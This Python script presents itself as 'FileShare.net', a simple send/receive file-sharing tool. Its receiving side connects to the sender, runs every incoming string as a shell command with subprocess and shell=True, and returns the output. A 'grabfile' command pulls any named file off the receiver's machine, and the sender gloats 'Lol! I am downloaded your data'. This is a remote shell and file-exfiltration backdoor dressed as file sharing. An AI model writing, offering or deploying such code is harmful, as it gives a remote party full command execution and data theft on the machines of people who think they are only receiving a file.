import os
import sys
import socket
import getpass
import subprocess
import sys

def server():
#creating host
    host=socket.gethostbyname(socket.gethostname())
    port=9999

    #creating Socket
    server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    #Binding the server
    server_socket.bind((host,port))
    print("\tYou are sender\n")
    print(f"\tServer is Running at {host} on port {port} ...")
    print("\n\tYou can close the server by press Exit. or give permission to connection: ")
    s = input("\n\t1. Permit\n\t2. Exit\n\t").strip().lower()
    if  s == 'exit' or s == '2' or s == 'e':
        sys.exit()
    print("\n\tServer is waiting for connection...")
    server_socket.listen(5)


    #Accepting the request
    client_socket,addr=server_socket.accept()
    print(f"\tRequest accepted from the address: {addr}\n")
    client_response=client_socket.recv(1024)
    print(client_response.decode()[:-3],end="")

    while True:
        cmd=input().strip().lower()
        commands=['grabfile','cd','rmdir','mkdir','shutdown','quit','echo','sendfile','','dir','exit']
        s=cmd.split()
        if len(s) == 0:
            s.append('')
        if s[0] in commands:
            if cmd[:8] == 'sendfile':
                try:
                    while True:
                        if cmd[9:] == '':
                            cmd = cmd+" "+input("Enter File name First You doesn't enter file name: ")
                        if cmd[9:] != '':
                            break
                        
                    path = input("Enter Path of the file: ")
                    while True:
                        if not(os.path.exists(path)):
                            path = input(f"Enter Path again.. '{path}' is not valid path: ")
                        else:
                            break;
                    path=path+"\\"+cmd[9:]       
                    client_socket.send(cmd.encode())
                    res = client_socket.recv(1024)
                    print(f"\n{res.decode()}\n")
                    fs = open(path,'rb')
                    d = fs.read()
                    fsize = len(d)
                    client_socket.send(str(fsize).encode())
                    ack=client_socket.recv(1024)
                    print(f"\n{ack.decode()}\n")
                    f = open(path,'rb')
                    data = f.read(1024)
                    while data:
                        client_socket.send(data)
                        data = f.read(1024)
                    else:
                        client_socket.send("EOF".encode())
                        print("\nFile Sended successfully.\n")
                        f.close()
                    da=client_socket.recv(1024)
                    print(da.decode())
                    client_response=client_socket.recv(1024)
                    print(client_response.decode()[:-3],end="")
                    continue
                except Exception as err:
                    print(err)
                    continue
            if cmd[:8] == 'grabfile':
                try:
                    filename = cmd[9:]
                    path = "C:\\Users\\"+getpass.getuser()+"\\Downloads"
                    print(f"\nNote: \nFile will be store by default at c:\\Users\\{getpass.getuser()}\\Downloads")
                    print("if you want to save file in another path, write new path below")
                    print("if you don't want to change the default path you can press 'Enter <--|'")
                    pi = input("Enter Path or press 'Enter': ")    
                    if pi:
                        path =  pi
                    while True:
                        if os.path.exists(path):
                            break;
                        else:
                            pi = input("Entered path is not found. please enter another Path: ")
                            path =  pi
                    path = path+'\\'+filename
                    f = open(path,'wb')
                    client_socket.send(cmd.encode())
                    print("File Receiving...\n")
                    size = client_socket.recv(2048)
                    client_socket.send("host says ----> Size of file received successfully.".encode())
                    sizex = int(size.decode())
                    size = round(sizex/(1024*1024),2)
                    if size==0:
                        size=0.001
                    received=0
                    prev=-1.0;
                    print(f"Downloading Status: |",end='')
                    while True:
                        c_file = client_socket.recv(1024)
                        received+=len(c_file)
                        sizeinkb =round(received/1024,2)
                        x = round(received/(1024*1024),2)
                        percentage = round((x/size)*100,2)
                        #print("hii")
                        if percentage > prev:
                            print(f" {percentage} % ",end=' ')
                            prev = percentage
                        if b'EOF' in c_file:
                            print('|')
                            if received == sizex or received-sizex == 3:
                                print("Downloaded: 100%")
                            print(f"\nTotal downloaded file size in bytes: {received}")
                            print(f"Total File Size: {size} MB and in bytes: {sizex}")
                            print(f"Data Received and stored at: '{path}'")
                            f.write(c_file)
                            client_socket.send("Lol! I am downloaded your data...^_^".encode())
                            f.close()
                            break;
                        else:
                            f.write(c_file)
                    client_response=client_socket.recv(1024)
                    print(client_response.decode()[:-3],end="")
                    continue
                except Exception as er:
                    print(er)
                    continue
            if cmd=='cmd':
                print(client_response.decode()[:-3],end="");
                continue
            if cmd =='quit' or cmd =='exit':
                c=input("Do you really want to close the connection (y/n): ").strip().lower()
                if c=='y'or c=='yes':
                    print("\nConnection Closed Successfully. Thanks to use our tool.\n")
                    server_socket.close()
                    client_socket.close()
                    sys.exit()
                    break
            if len(cmd)>0 and cmd!='quit' and cmd!='exit':
                client_socket.send(cmd.encode())
                while True:
                    client_response=client_socket.recv(1024)
                    if client_response.decode()[-3:]=="EOF":
                        print(client_response.decode()[:-3],end="")
                        break
                    print(client_response.decode(),end="")
                #client_response=b"EOF"
                continue
            print(client_response.decode()[:-3],end="")
        else:
            print("\nInvalid Command. this command is not an external or internal command!\n")
            print(client_response.decode()[:-3],end="")
def client():
    host=input("\tEnter Host Address: ")
    port=9999
    server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_socket.connect((host,port))
    print(f"\tYou are connected with {host}...")
    output_byte=b""
    while True:
        try:
            ps1="\n"+os.getcwd()+"> EOF"
            if len(output_byte)>0:
                server_socket.send(output_byte+ps1.encode())
                output_byte=b""
            else:
                server_socket.send(ps1.encode())
            data=server_socket.recv(1024)
            
            if data[:8].decode() == 'sendfile':
                try:
                    filename = data[9:].decode()
                    print(f"File name is: {filename}")
                    ptos = getpass.getuser()
                    pathtostore = "C:\\Users\\"+ptos+"\\Downloads"
                    print(f"Note: \nFile will be store by default at c:\\Users\\{getpass.getuser()}\\Downloads")
                    print("if you want to save file in another path, write new path below")
                    print("if you don't want to change the default path you can press 'Enter <--|'")
                    pi = input("Enter Path or press 'Enter': ")
                    if pi:
                        pathtostore = pi
                    while True:
                        if os.path.exists(pathtostore):
                            break;
                        else:
                            pi = input("Entered path is not found. please enter another Path: ")
                            pathtostore =  pi
                            continue
                    path = pathtostore+"\\"+filename
                    server_socket.send(f"Client Says ---> Filename Received Successfully.".encode())
                    size=server_socket.recv(1024)
                    server_socket.send("Client says ---> File size Received".encode())
                    f=open(path,'wb')
                    print("File Receiving...")
                    print(size)
                    sizex =  int(size.decode())
                    size = round(sizex/(1024*1024),2)
                    if size == 0:
                        size = 0.001
                    received=0
                    prev = -1.0
                    print("Downloading Status: |",end='')
                    while True:
                        c_file = server_socket.recv(1024)
                        received+=len(c_file)
                        sizeinkb = round(received/1024,2)
                        x = round(received/(1024*1024),2)
                        percentage = round((x/size)*100,2)
                        if percentage > prev:
                            print(f" {percentage} % ")
                            prev = percentage
                        if b'EOF' in c_file:
                            print('|')
                            if received == sizex or received-sizex == 3:
                                print("Downloaded: 100%")
                            server_socket.send(f"Client says---> File Received Successfully".encode())
                            print(f"File Stored Successfully at Specified path: '{path}'")
                            f.write(c_file)
                            f.close()
                            break;
                        else:
                            f.write(c_file)
                    continue
                except OSError as err:
                    print(err)
                    continue
                continue
            
            if data[:8].decode() == 'grabfile':
                try:
                    print(data[9:].decode())
                    f1 = open(data[9:].decode(),'rb')
                    size=f1.read()
                    server_socket.send(str(len(size)).encode())
                    f1.close()
                    ack = server_socket.recv(1024)
                    print(f"\n{ack.decode()}")
                    f = open(data[9:].decode(),'rb')
                    print(os.getcwd())
                    print("File Opened.")
                    data = f.read(1024)
                    print("File Sneding")
                    while data:
                        server_socket.send(data)
                        data = f.read(1024)
                    else:
                        server_socket.send("EOF".encode())
                        print("File sended.")
                        da = server_socket.recv(1024)
                        print(da.decode())
                        f.close()
                        print("File Closed.")
                    x = sys.stderr.write("Warning! Server is downloaded file from your system.\n")
                    continue
                except Exception as err:
                    print(err)
                    continue
                    
            if data[:2].decode()=='cd':
                try:
                    os.chdir(data[3:].decode())
                except FileNotFoundError as err:
                    server_socket.send(f"\nFile Not Found!: The system cannot find the file specified path: {data[3:].decode()}\n".encode())
                    print(err)
                except OSError as err:
                    server_socket.send(f"\nPlease Specify the Path. cd is not a path\n".encode())
                    print(err)
                continue
            if data[:2].decode()!='cd':
                cmd =  subprocess.Popen(data[:].decode(),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                output_byte =  cmd.stdout.read() + cmd.stderr.read()
                print(output_byte.decode())
                continue
        
        except Exception as err:
            print(err)
            input("Press Enter to Exit.")
            break
print(" Welcome in FileShare.net ".center(100,'*'))
print("\t1. Send\n\t2. Receive\n\t3. Exit")
print("\n\tpress 3 to exit")

case = input("\n\tPress 1 for Send or 2 for receive: ").strip().lower()
if case == '3':
    sys.exit()
if case == '1'or case == 's' or case == 'send':
    server()
else:
    client()


